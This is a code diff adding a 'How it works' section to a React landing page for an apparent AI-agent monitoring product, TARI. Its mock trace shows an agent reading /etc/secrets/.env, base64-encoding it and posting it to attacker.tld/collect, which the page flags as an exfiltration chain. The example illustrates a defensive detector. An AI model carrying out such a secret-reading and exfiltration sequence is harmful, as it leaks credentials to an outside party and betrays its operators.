@@ -264,6 +264,176 @@ const Home = () => {
         </div>
       </section>
 
+      {/* Section 4 — HOW IT WORKS */}
+      <section className="relative bg-perspective-grid py-24 md:py-40 px-4 md:px-8 overflow-hidden">
+        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-black/40 to-transparent pointer-events-none" />
+        <div className="pointer-events-none absolute -right-40 top-1/4 w-[520px] h-[520px] rounded-full bg-[radial-gradient(circle_at_center,rgba(166,252,252,0.05),transparent_70%)]" />
+
+        <div className="relative z-10 max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-12 gap-16 lg:gap-20 items-start">
+          {/* LEFT — copy + steps */}
+          <motion.div
+            className="lg:col-span-7 text-left"
+            initial={{ opacity: 0, y: 24 }}
+            whileInView={{ opacity: 1, y: 0 }}
+            viewport={{ once: true, amount: 0.3 }}
+            transition={{ duration: 0.9, ease: [0.16, 1, 0.3, 1] }}
+          >
+            <div className="flex items-center gap-3 mb-8">
+              <span className="h-px w-10 bg-white/30" />
+              <span className="text-[11px] tracking-[0.35em] font-light text-white/50 uppercase">How it works</span>
+            </div>
+
+            <h2 className="text-4xl md:text-6xl lg:text-7xl font-light tracking-tight text-white leading-[1.05]">
+              It reads the shape of
+              <br />
+              what your agent did.
+            </h2>
+
+            <p className="mt-10 md:mt-12 text-lg md:text-xl font-light text-white/70 leading-relaxed max-w-2xl">
+              Every agent leaves a trace: the tools it calls, the order it calls them, the boundaries it crosses. TARI reads that shape, and only that shape: the names and the timing, never your prompts, your data, or a word the agent wrote. From it, the patterns that betray a compromised agent, a secret pulled and quietly pushed out, an agent drifting past the task it was given, move the score.
+            </p>
+
+            <ol className="mt-14 md:mt-16 space-y-8 md:space-y-10 max-w-2xl">
+              {[
+                { title: "Instrument", body: "Three lines of code. Your agent emits a trace of what it did." },
+                { title: "Read the behavior", body: "Tool by tool, boundary by boundary. Content-off: the moves, never the message." },
+                { title: "Score the pattern", body: "An exfiltration chain, a scope drift, a call to a model it shouldn't reach. What looks like compromise moves the number." },
+              ].map((step, i) => (
+                <motion.li
+                  key={step.title}
+                  className="flex gap-6 md:gap-8"
+                  initial={{ opacity: 0, y: 12 }}
+                  whileInView={{ opacity: 1, y: 0 }}
+                  viewport={{ once: true, amount: 0.4 }}
+                  transition={{ duration: 0.7, delay: 0.1 + i * 0.1, ease: [0.16, 1, 0.3, 1] }}
+                >
+                  <span className="flex-shrink-0 text-xs tracking-[0.3em] font-light text-white/40 pt-1 w-8">
+                    0{i + 1}
+                  </span>
+                  <div>
+                    <div className="text-xl md:text-2xl font-light tracking-tight text-white">
+                      {step.title}
+                    </div>
+                    <div className="mt-2 text-sm md:text-base font-light text-white/60 leading-relaxed">
+                      {step.body}
+                    </div>
+                  </div>
+                </motion.li>
+              ))}
+            </ol>
+
+            <div className="mt-16 md:mt-20 pt-10 border-t border-white/10 max-w-2xl">
+              <p className="text-2xl md:text-4xl lg:text-5xl font-light tracking-tight text-white leading-[1.15]">
+                It never reads a word,
+                <br />
+                <span className="text-white/50">and it doesn't need to.</span>
+              </p>
+            </div>
+
+            <div className="mt-12">
+              <a
+                href="/methodology"
+                className="inline-flex items-center gap-2 text-sm font-light text-white/60 hover:text-white transition-colors duration-300 border-b border-white/20 hover:border-white/60 pb-1"
+              >
+                Read the full methodology
+                <span aria-hidden>→</span>
+              </a>
+            </div>
+          </motion.div>
+
+          {/* RIGHT — live trace visual */}
+          <motion.div
+            className="lg:col-span-5 lg:pt-4 lg:sticky lg:top-24"
+            initial={{ opacity: 0, y: 24 }}
+            whileInView={{ opacity: 1, y: 0 }}
+            viewport={{ once: true, amount: 0.2 }}
+            transition={{ duration: 1, delay: 0.15, ease: [0.16, 1, 0.3, 1] }}
+          >
+            <div className="relative rounded-2xl border border-white/10 bg-black/60 backdrop-blur-xl overflow-hidden shadow-[0_20px_80px_-20px_rgba(0,0,0,0.9)]">
+              <div className="flex items-center justify-between px-5 py-3 border-b border-white/10 bg-white/[0.02]">
+                <div className="flex items-center gap-2">
+                  <span className="w-2 h-2 rounded-full bg-white/20" />
+                  <span className="w-2 h-2 rounded-full bg-white/20" />
+                  <span className="w-2 h-2 rounded-full bg-white/20" />
+                </div>
+                <span className="text-[10px] tracking-[0.3em] uppercase text-white/40 font-light">
+                  live trace · content-off
+                </span>
+                <span className="flex items-center gap-1.5 text-[10px] text-white/50 font-light">
+                  <motion.span
+                    className="w-1.5 h-1.5 rounded-full bg-emerald-400"
+                    animate={{ opacity: [0.4, 1, 0.4] }}
+                    transition={{ duration: 1.6, repeat: Infinity }}
+                  />
+                  agent_7f2a
+                </span>
+              </div>
+
+              <div className="px-6 py-8 font-mono text-sm space-y-3">
+                {[
+                  { time: "00.014", call: "list_files", scope: "/workspace", danger: false },
+                  { time: "00.087", call: "read_file", scope: "/etc/secrets/.env", danger: true },
+                  { time: "00.203", call: "base64_encode", scope: "buffer", danger: true },
+                  { time: "00.412", call: "http_post", scope: "attacker.tld/collect", danger: true },
+                  { time: "00.518", call: "return", scope: "task_complete", danger: false },
+                ].map((row, i) => (
+                  <motion.div
+                    key={i}
+                    className="flex items-center gap-4"
+                    initial={{ opacity: 0, x: -8 }}
+                    whileInView={{ opacity: 1, x: 0 }}
+                    viewport={{ once: true, amount: 0.5 }}
+                    transition={{ duration: 0.5, delay: 0.3 + i * 0.25 }}
+                  >
+                    <span className="text-white/30 text-xs tabular-nums w-12">{row.time}</span>
+                    <span className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${row.danger ? 'bg-red-400' : 'bg-white/30'}`} />
+                    <span className={`${row.danger ? 'text-red-300' : 'text-white/80'} font-light`}>
+                      {row.call}
+                    </span>
+                    <span className="text-white/30 font-light truncate">
+                      {row.scope}
+                    </span>
+                  </motion.div>
+                ))}
+              </div>
+
+              <motion.div
+                className="mx-6 mb-6 mt-2 border border-red-400/30 bg-red-400/[0.04] rounded-lg px-4 py-3"
+                initial={{ opacity: 0, y: 8 }}
+                whileInView={{ opacity: 1, y: 0 }}
+                viewport={{ once: true, amount: 0.5 }}
+                transition={{ duration: 0.6, delay: 1.6 }}
+              >
+                <div className="flex items-center justify-between gap-4">
+                  <div>
+                    <div className="text-[10px] tracking-[0.3em] uppercase text-red-300/80 font-light">
+                      pattern flagged
+                    </div>
+                    <div className="mt-1 text-sm font-light text-red-200">
+                      exfiltration chain
+                    </div>
+                  </div>
+                  <div className="text-right">
+                    <div className="text-[10px] tracking-[0.2em] uppercase text-white/40 font-light">
+                      TARI Δ
+                    </div>
+                    <div className="mt-1 text-lg font-light text-red-300 tabular-nums">
+                      −247
+                    </div>
+                  </div>
+                </div>
+              </motion.div>
+            </div>
+
+            <div className="mt-4 text-[11px] tracking-[0.25em] uppercase text-white/30 font-light text-center">
+              read_file → base64_encode → post_to_url
+            </div>
+          </motion.div>
+        </div>
+      </section>
+
+
+
 
 
       {/* Placeholder actions section */}
